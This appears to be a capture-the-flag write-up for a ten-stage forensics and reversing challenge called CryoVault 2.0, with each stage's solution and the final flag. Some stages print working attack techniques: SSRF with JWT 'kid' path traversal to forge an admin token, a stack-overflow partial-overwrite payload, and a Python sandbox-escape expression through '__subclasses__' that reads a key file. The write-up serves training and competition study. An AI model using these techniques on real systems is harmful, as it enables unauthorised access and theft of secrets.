---
title: "CryoVault 2.0"
description: "The archive is a ten-stage chain. Each stage's answer is the key to the next sealed record; the final ten answers together decrypt vault.sealed."
event: "cryovault"
category: "misc"
categoryLabel: "Misc"
tags: ["ISFCR CryoVault Finals 2026","misc"]
date: "2026-10-26"
teammate: false
source: "cryovault/misc/redslayer/writeup.md"
---

**Final flag**

```text
isfcr{c0ld_st0rage_n3v3r_f0rg3ts_th3_th4w_s3qu3nc3}
```

The archive is a ten-stage chain. Each stage's answer is the key to the next
sealed record; the final ten answers together decrypt `vault.sealed`.

A recurring theme is deliberate decoy text. The audio metadata, the 1.0 archive,
some notes, and several recovered files all contain plausible but false
instructions or flags. The actual artifacts were always authoritative.

---

## 0. Archive layout

After extracting `cryovault-2.0.zip`:

```text
README.txt
unseal.py
coolant.wav
stage2.enc .. stage10.enc
vault.sealed
ARCHIVE/1.0/
```

`unseal.py` uses AES-256-GCM and a scrypt gate KDF. For stage `n`:

```text
key = scrypt(answer.strip().lower(), salt="cryovault2.0/stage<n>",
             N=2^17, r=8, p=1)
```

The final vault uses:

```text
key = scrypt("".join(a1..a10), salt="cryovault2.0/master",
             N=2^17, r=8, p=1)
```

Opening a record with a wrong answer fails cleanly.

---

## 1. Coolant telemetry — `coolant.wav`

The WAV metadata comment claims the channel-difference signal is meaningless,
points at the 1.0 archive, and supplies a fake prior extraction result:

```text
isfcr{ph4s3_sh1ft_k3yw0rd_r3c0v3rd}
```

The file itself has a second payload: a ZIP appended after the WAV data at offset
`4234290`. It contains `THAW_PROCEDURE.txt`, which describes the real carrier:

- 1200 baud AFSK, 8N1
- mark 1200 Hz, space 2200 Hz
- carried on the channel difference `L - R`
- repeated six times per sweep
- each frame ends in `crc=<two hex digits>`, CRC-8 poly `0x07`

Subtracting the channels and decoding the AFSK with matched filters around
1200 Hz and 2200 Hz gives frames like:

```text
thaw-sequence: coolant-phase-lock-9f41c6d2b7e05a13 crc=0d
```

The CRC over the text before ` crc=` matches `0d`. The authorisation is the value
after the colon:

```text
coolant-phase-lock-9f41c6d2b7e05a13
```

---

## 2. FrostRNG — stage 2

Stage 2 contains `seal.py` and `sealed_manifest.bin`.

`seal.py` is a reconstructed FrostRNG: a 64-bit LCG whose top byte is emitted.
Its suspected constants are:

```python
A    = 0x9E3779B95F4A7C55
C    = 0x14057B7EF767814F
MIX  = 0x2545F4914F6CDD1D
```

The manifest header gives a self-test vector:

```text
selftest: seed=1 ks=60d96d937375e125
```

The supplied constants do not produce that keystream. Since the notes warn that a
single transcribed hex digit is likely wrong, brute-forcing one hex digit in
`A`, `C`, or `MIX` gives the corrected multiplier:

```python
A = 0x9E3779B97F4A7C55
```

The manifest header also says the seal is keyed on the exact second of sealing,
with only the date `2026-07-14` surviving. Brute-forcing Unix timestamps around
that date and testing for the known plaintext prefix
`CRYOVAULT-2.0-MANIFEST\n\x00` gives:

```text
seed = 1784039831
```

Decrypting the manifest yields a node table. The instructions say to choose the
one node that is both `SEALED` and `vault-primary`:

```text
hostname = cryo-node-07.frostline.isfcr
state    = SEALED
role     = vault-primary
seal_id  = 9c4e2a1b7d63f805
```

Authorisation 2:

```text
9c4e2a1b7d63f805
```

---

## 3. FrostVM — stage 3

Stage 3 contains `controller.elf` and `docs/VM_ISA.txt`.

The VM documentation contains an erratum saying the shipped core is
authoritative. Disassembling the VM handlers shows the real opcode semantics
differ from the document, notably:

- `0x03` is `ADDK` (the document says subtract)
- `0x08` is `SUBK` (the document says add)

The 24-byte input buffer is transformed by an embedded straight-line FROSTVM
program at `0x47ed8a`, then compared against 24 bytes at `0x47f3d6`.

Every VM operation is invertible. Running the program backwards from the
expected output, using the cursor value recorded at each forward step, recovers
the input:

```text
THAW-5F3A-9C21-B8E4-0D77
```

Running the original binary and supplying that code prints:

```text
AUTHORISED -- thaw sequence accepted
```

Authorisation 3:

```text
THAW-5F3A-9C21-B8E4-0D77
```

---

## 4. Operations console — stage 4

`CONSOLE.txt` points at the web operations console. Registering with the stage 3
thaw code returns an operations token:

```bash
curl -X POST https://isfcrpesu-redslayer-console.chals.io/register \
  -H 'Content-Type: application/json' \
  -d '{"thaw_code":"THAW-5F3A-9C21-B8E4-0D77"}'
```

The node telemetry for the decommissioned node 8 reveals where maintenance
control moved:

```text
maintenance control was migrated off this node to the internal service
at http://cryo-admin.internal:8080
```

The console has an SSRF endpoint, `POST /api/fetch`, which can reach the
internal service. The admin service root describes its authentication:

- JWT HS256
- accepted via `Authorization: Bearer <token>` or `?token=<token>`
- signing key selected by the JWT `kid` header
- key loaded from `keys/<kid>`

That is a path-traversal vulnerability. Using `kid` pointing at a file with
known contents, `/proc/sys/kernel/ostype` (`Linux\n`), and a payload with
`role: "admin"` produces an accepted token.

Requesting `/maintenance` with that token returns:

```json
{
  "maintenance_window": "mw-2026-0714-7e3a9c4f1b6d8205"
}
```

Authorisation 4:

```text
mw-2026-0714-7e3a9c4f1b6d8205
```

---

## 5. Modbus capture — stage 5

Stage 5 contains `control_sweep.pcap`. The notes say the control network is
configured to zero the IPv4 identification field, but the monitoring system
flagged non-compliant traffic.

Extract the non-zero IP IDs in capture order:

```bash
tshark -r control_sweep.pcap -Y 'ip.id != 0' -T fields -e ip.id
```

There are 20 values:

```text
30c8 2dd4 35c5 71cf 35d5 2ece 3bc4 328c 3ed8 2cc0
2fd2 7192 3896 3990 3d98 3f94 3a93 64c3 6891 6aa1
```

The notes also mention exactly one Modbus write. Filtering for function code 6:

```bash
tshark -r control_sweep.pcap -Y 'modbus.func_code == 6' -V
```

shows a write of register 32 with value:

```text
23713 = 0x5ca1
```

XOR each 16-bit IP ID with `0x5ca1` and interpret the result big-endian. This
produces:

```text
liquid-nitrogen-bypass-3d7e1a9c5f28b406\x00
```

The trailing NUL is not part of the answer. The passphrase embedded in the
Modbus payload is a decoy; the IP ID artifact is authoritative.

Authorisation 5:

```text
liquid-nitrogen-bypass-3d7e1a9c5f28b406
```

---

## 6. Coolant pump daemon — stage 6

Stage 6 contains the `pumpd` binary. It is a static PIE, not stripped, and the
notes mention that the scheduler path was built without the stack protector.

The daemon asks for the maintenance phrase. Supplying authorisation 5 unlocks
the menu. Menu option 2 calls `set_schedule`:

```asm
sub rsp, 0x48
...
mov edx, 0x100
mov edi, 0
mov rsi, rsp
call read
```

It reads 256 bytes into a 72-byte stack frame, with no stack canary. The saved
return address is at offset `0x48`.

The binary also contains a `thaw_override` function at PIE offset `0x7a27`. It
prints the environment variable `CRYO_KEYSHARE_6` and exits. The normal return
address after `set_schedule` is `main+0x7cff`.

A partial overwrite of the low two bytes of the saved return address is enough
to redirect execution to `thaw_override`:

```python
payload = b"A" * 0x48 + b"\x27\x7a"
```

This works for 9 of the 16 possible ASLR placements; otherwise the process
crashes and a new connection is opened.

After a successful attempt the daemon prints:

```text
[override] keyshare.6: 6f3b1d9a4c8e2057
```

Authorisation 6:

```text
6f3b1d9a4c8e2057
```

---

## 7. Vault backup image — stage 7

Stage 7 contains a 16 MiB FAT16 image, `backup.img`, plus 240 rotated controller
logs.

### Site code from SQLite freelist

`backup.img` contains:

```text
CRYO.DB
BASHHIST.TXT
NOTES.TXT
SEALMON.LOG
```

`SEALMON.LOG` contains a decoy flag:

```text
isfcr{c0ld_tr41l_r3c0v3r3d_0k}
```

`CRYO.DB` still has a `config` table and a `nodes` table, but `seal_cfg` was
dropped. The deleted table's pages remain in the SQLite freelist. Recovering the
record for `seal.site_code` gives:

```text
FROSTLINE-7-9C4E2A1B7D63
```

### Rotation values from logs

Grepping for `SEAL-ROT` finds one block in
`controller.log.137`:

```text
SEAL-ROT stage=derive site=<redacted> rot=0447 alg=sha256
SEAL-ROT stage=commit authz=5e81c0a4 ticket=FAC-CHG-2291
```

So:

```text
rotation = 0447
authz    = 5e81c0a4
```

### Deleted share container

The FAT directory still contains the deleted `SHARE.ENC` entry (first byte
`0xE5`) with size `177` and starting cluster `42`. Carving those bytes recovers
the container.

`BASHHIST.TXT` explains the passphrase construction:

```text
<site-code>/<rotation>-<authz>
```

so the passphrase is:

```text
FROSTLINE-7-9C4E2A1B7D63/0447-5e81c0a4
```

The share format is:

```text
magic       "FROSTSHARE1"     11 bytes
length      150               uint32 little-endian
nonce       12 bytes
sealed      150 bytes         AES-GCM ciphertext + tag
```

The key derivation is scrypt with the magic string as the salt:

```python
P = b"FROSTLINE-7-9C4E2A1B7D63/0447-5e81c0a4"
key = hashlib.scrypt(P, salt=b"FROSTSHARE1",
                     n=1 << 17, r=8, p=1, dklen=32)
```

Decrypting with `AAD=b"FROSTSHARE1"` yields:

```text
keyshare.7: a1c47e05b93f682d

This is authorisation 7. Record 8 (stage8.enc) opens with it and
holds the core recalibration material.
```

Authorisation 7:

```text
a1c47e05b93f682d
```

---

## 8. SPI EEPROM and core console — stage 8

### SPI capture

`spi_capture.csv` has columns:

```text
time_ns, CS, CLK, MOSI, MISO
```

The analyser sample interval is fixed, but the SPI clock is not; decoding must
use actual clock edges. The correct rule is:

> while `CS == 0`, sample `MISO` on every rising edge of `CLK`

The decoded MOSI is:

```text
03 00 40 ...
```

i.e. EEPROM read command `0x03`, address `0x0040`. The first 24 MISO bits are
dummy clocks; the following 16 bytes are the EEPROM seed:

```text
23f493b5021564054dad0030061f71eb
```

### Core console

The core console asks for a proof of work:

```text
find NONCE such that sha256('<prefix>' + NONCE)
has at least 20 leading zero bits
```

After the PoW it accepts the 32-hex-character seed, then one Python expression.

The evaluation namespace has no builtins, but the sandbox can be escaped through
a Python object's class hierarchy. The `_wrap_close` class exposes the `os`
module through its `__init__.__globals__`:

```python
(lambda g: g['read'](g['open']('/opt/cryo/core.key', g['O_RDONLY']), 4096))(
    [c for c in ().__class__.__base__.__subclasses__()
     if c.__name__ == '_wrap_close'][0].__init__.__globals__
)
```

This returns:

```text
d4e91c7a05b8236f
```

Authorisation 8:

```text
d4e91c7a05b8236f
```

---

## 9. Thermal array — stage 9

Stage 9 has 48 thermal frames, each a 32 x 128 grid of Celsius readings. The
notes say the array is meant to be frame-averaged; the exporter wrote raw
exposures instead.

Averaging all 48 frames per pixel reduces the per-pixel noise enough to reveal a
16-character string across the middle rows:

```text
b7e3a01d5c86f249
```

Authorisation 9:

```text
b7e3a01d5c86f249
```

---

## 10. Dial verification sheets — stage 10

Stage 10 contains 2,400 scanned dial sheets. The instructions say:

- 16 verified readings are **ringed and double-underlined**
- 8 unverified readings are **ringed and single-underlined**
- everything else is scribble
- read the hex character inside the ring, order by the number written beside it

Detecting roughly circular contours (as opposed to the many ordinary
`[ ... ]` bracketed spans) gives exactly 24 ringed sheets. Counting solid
horizontal underline strokes below each ring separates them into 8 single and
16 double underlines.

The eight single-underlined sheets were excluded:

```text
ds_20200222-0832
ds_20220121-1545
ds_20220228-0738
ds_20220601-0215
ds_20220920-1716
ds_20230628-0303
ds_20240208-1321
ds_20240826-1305
```

The 16 verified sheets, ordered by the number written beside the ring:

| Position | Sheet | Nibble |
|---:|---|---|
| 1 | `ds_20200714-2154` | `3` |
| 2 | `ds_20240903-1126` | `f` |
| 3 | `ds_20220127-0204` | `8` |
| 4 | `ds_20250923-1922` | `c` |
| 5 | `ds_20250228-1558` | `1` |
| 6 | `ds_20260207-1301` | `e` |
| 7 | `ds_20241225-0940` | `0` |
| 8 | `ds_20221207-0554` | `7` |
| 9 | `ds_20240516-2148` | `a` |
| 10 | `ds_20200325-1041` | `5` |
| 11 | `ds_20230119-0113` | `b` |
| 12 | `ds_20240916-0825` | `9` |
| 13 | `ds_20210515-1752` | `d` |
| 14 | `ds_20200821-0525` | `4` |
| 15 | `ds_20200421-1431` | `2` |
| 16 | `ds_20240713-0016` | `6` |

That gives:

```text
3f8c1e07a5b9d426
```

The position-6 glyph is easy to misread as `6`; the correct character is `e`.
A small brute-force over the few ambiguous handwritten glyphs can be checked
directly against `vault.sealed`, since a wrong sequence fails the GCM tag.

Authorisation 10:

```text
3f8c1e07a5b9d426
```

---

## Final vault

All ten:

```text
1  coolant-phase-lock-9f41c6d2b7e05a13
2  9c4e2a1b7d63f805
3  THAW-5F3A-9C21-B8E4-0D77
4  mw-2026-0714-7e3a9c4f1b6d8205
5  liquid-nitrogen-bypass-3d7e1a9c5f28b406
6  6f3b1d9a4c8e2057
7  a1c47e05b93f682d
8  d4e91c7a05b8236f
9  b7e3a01d5c86f249
10 3f8c1e07a5b9d426
```

Run:

```bash
python3 unseal.py vault \
  "coolant-phase-lock-9f41c6d2b7e05a13" \
  "9c4e2a1b7d63f805" \
  "THAW-5F3A-9C21-B8E4-0D77" \
  "mw-2026-0714-7e3a9c4f1b6d8205" \
  "liquid-nitrogen-bypass-3d7e1a9c5f28b406" \
  "6f3b1d9a4c8e2057" \
  "a1c47e05b93f682d" \
  "d4e91c7a05b8236f" \
  "b7e3a01d5c86f249" \
  "3f8c1e07a5b9d426"
```

Output:

```text
isfcr{c0ld_st0rage_n3v3r_f0rg3ts_th3_th4w_s3qu3nc3}
```
